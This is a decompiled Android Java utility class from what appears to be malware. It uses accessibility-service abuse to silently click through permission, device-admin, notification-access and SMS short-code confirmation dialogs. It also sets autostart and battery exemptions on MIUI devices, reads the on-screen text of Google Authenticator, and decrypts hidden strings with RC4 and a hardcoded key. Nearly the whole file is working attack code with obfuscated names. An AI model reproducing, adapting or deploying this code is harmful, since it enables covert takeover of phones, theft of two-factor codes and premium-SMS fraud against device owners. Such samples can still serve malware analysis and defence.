/*
 * Decompiled with CFR <Could not determine version>.
 * 
 * Could not load the following classes:
 *  android.accessibilityservice.AccessibilityService
 *  android.content.ComponentName
 *  android.content.Context
 *  android.content.Intent
 *  android.graphics.Rect
 *  android.os.Build
 *  android.os.Build$VERSION
 *  android.os.Bundle
 *  android.util.Base64
 *  android.view.accessibility.AccessibilityEvent
 *  android.view.accessibility.AccessibilityNodeInfo
 */
package com.example.mmm.Utils;

import android.accessibilityservice.AccessibilityService;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.Rect;
import android.os.Build;
import android.os.Bundle;
import android.util.Base64;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Utils.utils;
import com.example.mmm.constants;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;

public final class utils2 {
    static utils declined$ = new utils();
    constants florida$ = new constants();

    static AccessibilityNodeInfo _selling(AccessibilityEvent accessibilityEvent, String string) {
        if (accessibilityEvent != null) return utils2._privacy(accessibilityEvent.getSource(), string);
        return null;
    }

    private static void _acute(int n2, int n3, AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo == null) {
            return;
        }
        if (accessibilityNodeInfo.getChildCount() == 0) {
            Rect rect = new Rect();
            accessibilityNodeInfo.getBoundsInScreen(rect);
            if (!rect.contains(n2, n3)) return;
            accessibilityNodeInfo.performAction(16);
            return;
        }
        Rect rect = new Rect();
        accessibilityNodeInfo.getBoundsInScreen(rect);
        if (rect.contains(n2, n3)) {
            accessibilityNodeInfo.performAction(16);
        }
        int n4 = 0;
        while (n4 < accessibilityNodeInfo.getChildCount()) {
            utils2._acute(n2, n3, accessibilityNodeInfo.getChild(n4));
            ++n4;
        }
    }

    public static void _plains(AccessibilityService accessibilityService, int n2, int n3) {
        if (Build.VERSION.SDK_INT <= 16) return;
        utils2._acute(n2, n3, accessibilityService.getRootInActiveWindow());
    }

    public static void _batch(AccessibilityNodeInfo accessibilityNodeInfo, String string) {
        if (Build.VERSION.SDK_INT < 18) return;
        Bundle bundle = new Bundle();
        bundle.putString("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", string);
        accessibilityNodeInfo.performAction(2097152, bundle);
    }

    private static List _habitat(AccessibilityNodeInfo accessibilityNodeInfo, String string) {
        ArrayList<AccessibilityNodeInfo> arrayList = new ArrayList<AccessibilityNodeInfo>();
        if (accessibilityNodeInfo == null) {
            return arrayList;
        }
        int n2 = accessibilityNodeInfo.getChildCount();
        int n3 = 0;
        while (n3 < n2) {
            AccessibilityNodeInfo accessibilityNodeInfo2 = accessibilityNodeInfo.getChild(n3);
            if (accessibilityNodeInfo2 != null) {
                if (accessibilityNodeInfo2.getClassName().toString().toLowerCase().contains(string.toLowerCase())) {
                    arrayList.add(accessibilityNodeInfo2);
                } else {
                    arrayList.addAll(utils2._habitat(accessibilityNodeInfo2, string));
                }
            }
            ++n3;
        }
        return arrayList;
    }

    private static AccessibilityNodeInfo _privacy(AccessibilityNodeInfo object, String string) {
        AccessibilityNodeInfo accessibilityNodeInfo = null;
        if (object == null) {
            return null;
        }
        AccessibilityNodeInfo accessibilityNodeInfo2 = accessibilityNodeInfo;
        if (Build.VERSION.SDK_INT < 18) return accessibilityNodeInfo2;
        object = object.findAccessibilityNodeInfosByViewId(string);
        accessibilityNodeInfo2 = accessibilityNodeInfo;
        if (object.size() <= 0) return accessibilityNodeInfo2;
        return (AccessibilityNodeInfo)object.get(0);
    }

    public final String _roster(String string) {
        return new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode((String)string, (int)0), "UTF-8"))));
    }

    public final void _cornell(Context context) {
        Intent intent = new Intent("miui.intent.action.APP_PERM_EDITOR");
        intent.setClassName("com.miui.securitycenter", "com.miui.permcenter.permissions.PermissionsEditorActivity");
        intent.putExtra("extra_pkgname", context.getPackageName());
        intent.setFlags(268435456);
        context.startActivity(intent);
    }

    public final boolean _santa(AccessibilityService accessibilityService, AccessibilityEvent accessibilityEvent, String object) {
        if (Build.VERSION.SDK_INT < 18) return false;
        if (!((String)object).contains("com.google.android.permissioncontroller")) return false;
        declined$.Log("run", "for clicked com.android.packageinstaller.role.ui.requestroleactivity  ");
        if (accessibilityEvent.getSource() == null) {
            return false;
        }
        object = utils2._habitat(accessibilityEvent.getSource(), "android.widget.LinearLayout").iterator();
        boolean bl = false;
        block0 : while (object.hasNext()) {
            AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo)object.next();
            int n2 = 0;
            do {
                if (n2 >= accessibilityNodeInfo.getChildCount()) continue block0;
                AccessibilityNodeInfo accessibilityNodeInfo2 = accessibilityNodeInfo.getChild(n2);
                boolean bl2 = bl;
                if (accessibilityNodeInfo2.getText() != null) {
                    declined$.Log("=========", accessibilityNodeInfo2.getText().toString());
                    bl2 = bl;
                    if (accessibilityNodeInfo2.getText().toString().equals(declined$.getLabelApplication((Context)accessibilityService))) {
                        accessibilityNodeInfo.performAction(16);
                        bl2 = true;
                    }
                }
                ++n2;
                bl = bl2;
            } while (true);
            break;
        }
        return false;
    }

    public final boolean _shannon(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo == null) {
            return false;
        }
        declined$.Log("AccessibilityClickButton", accessibilityNodeInfo.toString());
        return accessibilityNodeInfo.performAction(16);
    }

    public final void _presence(AccessibilityService accessibilityService, AccessibilityEvent object, String object2) {
        if (Build.VERSION.SDK_INT < 18) return;
        if (!((String)object2).contains("com.google.android.apps.authenticator2")) return;
        declined$.Log("run", "com.google.android.apps.authenticator2");
        if (object.getSource() == null) {
            return;
        }
        object2 = "";
        Iterator iterator = utils2._habitat(object.getSource(), "android.view.ViewGroup").iterator();
        int n2 = 0;
        object = object2;
        do {
            if (!iterator.hasNext()) {
                ((String)object).isEmpty();
                return;
            }
            AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo)iterator.next();
            for (int i2 = 0; i2 < accessibilityNodeInfo.getChildCount(); ++i2) {
                AccessibilityNodeInfo accessibilityNodeInfo2 = accessibilityNodeInfo.getChild(i2);
                object2 = object;
                if (accessibilityNodeInfo2.getText() != null) {
                    object2 = declined$;
                    StringBuilder stringBuilder = new StringBuilder();
                    stringBuilder.append("Line: ");
                    stringBuilder.append(n2);
                    stringBuilder.append(", index: ");
                    stringBuilder.append(i2);
                    ((utils)object2).Log(stringBuilder.toString(), accessibilityNodeInfo2.getText().toString());
                    object2 = new StringBuilder();
                    ((StringBuilder)object2).append((String)object);
                    ((StringBuilder)object2).append("Line: ");
                    ((StringBuilder)object2).append(n2);
                    ((StringBuilder)object2).append(", index: ");
                    ((StringBuilder)object2).append(i2);
                    ((StringBuilder)object2).append(", text: ");
                    ((StringBuilder)object2).append(accessibilityNodeInfo2.getText().toString());
                    ((StringBuilder)object2).append("\n");
                    object2 = ((StringBuilder)object2).toString();
                }
                object = object2;
            }
            ++n2;
        } while (true);
    }

    public final void _fires(Context context) {
        Intent intent = new Intent();
        intent.setComponent(new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity"));
        intent.setFlags(268435456);
        context.startActivity(intent);
    }

    public final boolean _phone(AccessibilityEvent object, String string) {
        if (Build.VERSION.SDK_INT < 18) return false;
        if (!string.contains("com.miui.powerkeeper.ui.hiddenappsconfigactivity")) return false;
        declined$.Log("run", "for clicked3");
        utils.chalkTile(40);
        object = utils2._habitat(object.getSource(), "android.widget.LinearLayout").iterator();
        block0 : while (object.hasNext()) {
            string = (AccessibilityNodeInfo)object.next();
            int n2 = 0;
            do {
                if (n2 >= string.getChildCount()) continue block0;
                AccessibilityNodeInfo accessibilityNodeInfo = string.getChild(n2);
                if (accessibilityNodeInfo.getViewIdResourceName() != null && accessibilityNodeInfo.getViewIdResourceName().equals("android:id/title")) {
                    this._shannon((AccessibilityNodeInfo)string);
                    return true;
                }
                ++n2;
            } while (true);
            break;
        }
        return false;
    }

    public final void _tulsa(Context context) {
        Intent intent = new Intent();
        intent.setClassName("com.miui.powerkeeper", "com.miui.powerkeeper.ui.HiddenAppsConfigActivity");
        intent.putExtra("package_name", context.getPackageName());
        intent.putExtra("package_label", declined$.getLabelApplication(context));
        intent.setFlags(268435456);
        context.startActivity(intent);
    }

    public final boolean _bases(AccessibilityService accessibilityService, AccessibilityEvent object, String string) {
        if (Build.VERSION.SDK_INT < 18) return false;
        if (!string.contains("com.miui.permcenter.autostart.autostartmanagementactivity")) return false;
        declined$.Log("run", "for clicked2");
        utils.chalkTile(40);
        object = utils2._habitat(object.getSource(), "android.widget.LinearLayout").iterator();
        block0 : while (object.hasNext()) {
            string = (AccessibilityNodeInfo)object.next();
            int n2 = 0;
            boolean bl = false;
            do {
                if (n2 >= string.getChildCount()) continue block0;
                AccessibilityNodeInfo accessibilityNodeInfo = string.getChild(n2);
                boolean bl2 = bl;
                if (accessibilityNodeInfo.getViewIdResourceName() != null) {
                    utils utils3 = declined$;
                    String string2 = "==============";
                    StringBuilder stringBuilder = new StringBuilder();
                    stringBuilder.append("text: ");
                    stringBuilder.append((Object)accessibilityNodeInfo.getText());
                    stringBuilder.append("  id: ");
                    stringBuilder.append(accessibilityNodeInfo.getViewIdResourceName());
                    utils3.Log(string2, stringBuilder.toString());
                    bl2 = bl;
                    if (accessibilityNodeInfo.getText() != null) {
                        boolean bl3 = declined$.getLabelApplication((Context)accessibilityService).contains(accessibilityNodeInfo.getText().toString());
                        bl2 = bl;
                        if (bl3) {
                            bl2 = true;
                        }
                    }
                }
                ++n2;
                bl = bl2;
            } while (true);
            break;
        }
        return false;
    }

    public final boolean _referral(AccessibilityEvent accessibilityEvent, String string) {
        if (Build.VERSION.SDK_INT < 18) return false;
        if (!string.contains("android.app.alertdialog")) return false;
        if ((accessibilityEvent = accessibilityEvent.getSource()) == null) {
            return false;
        }
        string = utils2._privacy((AccessibilityNodeInfo)accessibilityEvent, "android:id/sms_short_code_remember_choice_checkbox");
        if (string == null) return false;
        this._shannon((AccessibilityNodeInfo)string);
        accessibilityEvent = utils2._privacy((AccessibilityNodeInfo)accessibilityEvent, "android:id/button1");
        if (accessibilityEvent == null) return false;
        this._shannon((AccessibilityNodeInfo)accessibilityEvent);
        return true;
    }

    public final boolean _console(AccessibilityService accessibilityService, AccessibilityEvent object, String string) {
        if (string.contains("com.android.settings.settings$notificationaccesssettingsactivity") && utils.isNotificationServiceEnabled((Context)accessibilityService)) {
            return true;
        }
        if (utils.isNotificationServiceEnabled((Context)accessibilityService)) return false;
        if (Build.VERSION.SDK_INT < 18) return false;
        if (!string.contains("com.android.settings.settings$notificationaccesssettingsactivity")) return false;
        declined$.Log("run", "for clicked3");
        object = utils2._habitat(object.getSource(), "android.widget.LinearLayout").iterator();
        block0 : while (object.hasNext()) {
            string = (AccessibilityNodeInfo)object.next();
            int n2 = 0;
            do {
                if (n2 >= string.getChildCount()) continue block0;
                AccessibilityNodeInfo accessibilityNodeInfo = string.getChild(n2);
                if (accessibilityNodeInfo.getText() != null && accessibilityNodeInfo.getText().equals("euwvxmpnqta")) {
                    this._shannon((AccessibilityNodeInfo)string);
                    declined$.SettingsWrite((Context)accessibilityService, "SQ", "1");
                }
                ++n2;
            } while (true);
            break;
        }
        return false;
    }

    public final boolean _obtain(AccessibilityEvent object, String string) {
        if (Build.VERSION.SDK_INT < 18) return false;
        if (object.getSource() == null) {
            return false;
        }
        if (!string.contains("com.android.settings.deviceadminadd")) return false;
        declined$.Log("run", "for clicked");
        object = utils2._habitat(object.getSource(), "android.widget.LinearLayout").iterator();
        while (object.hasNext()) {
            ((AccessibilityNodeInfo)object.next()).performAction(16);
        }
        return false;
    }

    /*
     * Unable to fully structure code
     */
    public final boolean _declared(AccessibilityService var1_1, AccessibilityEvent var2_2, String var3_3) {
        if (Build.VERSION.SDK_INT < 18) return false;
        var7_4 = var2_2.getSource();
        if (var7_4 == null) {
            return false;
        }
        if ((var7_4 = utils2._privacy(var7_4, "android:id/text1")) != null) {
            this._shannon(var7_4);
            utils2.declined$.Log("CLK", "GOOD CLICK!");
            utils2.declined$.SettingsWrite((Context)var1_1, "XB", "1");
            utils2.declined$._chapel((Context)var1_1);
            return true;
        }
        if (var3_3.contains("com.miui.permcenter.permissions.permissionseditoractivity") == false) return false;
        utils2.declined$.Log("run", "for clicked");
        utils.chalkTile(40);
        var1_1 = utils2._habitat(var2_2.getSource(), "android.widget.LinearLayout");
        var2_2 = var1_1.iterator();
        var4_5 = 0;
        block0 : do lbl-1000: // 3 sources:
        {
            if (var2_2.hasNext() == false) return false;
            var3_3 = (AccessibilityNodeInfo)var2_2.next();
            var4_5 = var6_7 = var4_5 + 1;
            if (var1_1.size() - 1 != var6_7) ** GOTO lbl-1000
            var5_6 = 0;
            do {
                var4_5 = var6_7;
                if (var5_6 >= var3_3.getChildCount()) continue block0;
                var7_4 = var3_3.getChild(var5_6);
                if (var7_4.getViewIdResourceName() != null && var7_4.getViewIdResourceName().equals("com.miui.securitycenter:id/action")) {
                    var8_8 = utils2.declined$;
                    var9_9 = "=======";
                    var10_10 = new StringBuilder();
                    var10_10.append(var7_4.getViewIdResourceName());
                    var8_8.Log(var9_9, var10_10.toString());
                    var3_3.performAction(16);
                }
                ++var5_6;
            } while (true);
            break;
        } while (true);
    }
}

